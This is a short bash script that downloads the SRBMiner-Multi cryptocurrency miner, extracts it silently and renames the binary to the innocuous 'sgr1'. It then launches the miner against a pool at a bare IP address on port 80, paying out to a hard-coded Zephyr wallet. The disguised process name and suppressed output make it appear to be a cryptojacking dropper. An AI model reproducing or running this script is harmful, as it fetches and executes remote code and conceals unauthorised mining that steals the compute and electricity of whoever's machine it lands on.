#!/bin/bash
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.0/SRBMiner-Multi-1-0-0-Linux.tar.xz
tar xf SRBMiner-Multi-1-0-0-Linux.tar.xz >/dev/null 2>&1
cd SRBMiner-Multi-1-0-0
mv SRBMiner-MULTI sgr1
./sgr1 --algorithm randomx --pool 95.179.243.207:80 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password x --disable-cpu-optimisations --disable-huge-pages --disable-hw-aes --disable-msr-tweaks --disable-numa --cpu-threads 4
